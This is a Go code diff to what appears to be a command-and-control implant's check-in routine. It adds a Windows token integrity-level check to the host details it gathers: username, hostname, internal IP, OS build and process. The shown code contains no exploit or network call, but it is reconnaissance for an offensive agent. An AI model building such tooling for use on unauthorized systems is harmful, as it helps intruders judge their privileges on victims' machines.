@@ -15,6 +15,8 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"unsafe"
+	"golang.org/x/sys/windows"
 )
 
 func getSysinfo(server string, nonce string) string {
@@ -26,10 +28,15 @@ func getSysinfo(server string, nonce string) string {
 	operatingsystem := runtime.GOOS
 	v := w32.RtlGetVersion()
 	osDetails := fmt.Sprintf("%s %d Build:%d", operatingsystem, v.MajorVersion, v.BuildNumber)
-	highIntegrity := fmt.Sprintf("%t", false)
 	internalIP := getIP()
 	architecture := runtime.GOARCH
 	version := "1.23"
+
+	hi, err := IsHighIntegrity()
+	if err != nil {
+		hi = false
+	}
+	highIntegrity := fmt.Sprintf("%t", hi)
 
 	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
 		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
@@ -49,6 +56,42 @@ func getIP() string {
 		}
 	}
 	return ""
+}
+
+func IsHighIntegrity() (bool, error) {
+	const (
+		SECURITY_MANDATORY_HIGH_RID = 0x00003000
+	)
+
+	hProc := windows.CurrentProcess()
+
+	var tok windows.Token
+	if err := windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &tok); err != nil {
+		return false, err
+	}
+	defer tok.Close()
+
+	var outLen uint32
+	err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, nil, 0, &outLen)
+	if err != windows.ERROR_INSUFFICIENT_BUFFER {
+		return false, err
+	}
+
+	buf := make([]byte, outLen)
+	if err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, &buf[0], outLen, &outLen); err != nil {
+		return false, err
+	}
+
+	type tokenMandatoryLabel struct {
+		Label windows.SIDAndAttributes
+	}
+	tml := (*tokenMandatoryLabel)(unsafe.Pointer(&buf[0]))
+	sid := tml.Label.Sid
+
+	subAuthCount := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + 1))
+	lastRID := *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + uintptr(8+int(subAuthCount-1)*4)))
+
+	return lastRID >= SECURITY_MANDATORY_HIGH_RID, nil
 }
 
 func main() {
